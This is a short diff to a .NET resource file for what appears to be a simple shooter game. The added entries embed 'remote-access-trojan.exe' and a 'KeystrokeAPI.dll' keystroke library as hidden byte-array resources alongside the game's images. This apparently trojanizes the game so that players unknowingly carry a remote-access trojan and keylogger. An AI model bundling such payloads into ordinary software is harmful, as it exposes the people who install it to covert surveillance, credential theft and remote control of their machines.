@@ -130,6 +130,12 @@
   <data name="invador" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\invador.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
   </data>
+  <data name="KeystrokeAPI" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\remote-access-trojan\KeystrokeAPI.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="remote_access_trojan" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\remote-access-trojan\remote-access-trojan.exe;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
   <data name="shooter" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\shooter.jpg;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
   </data>
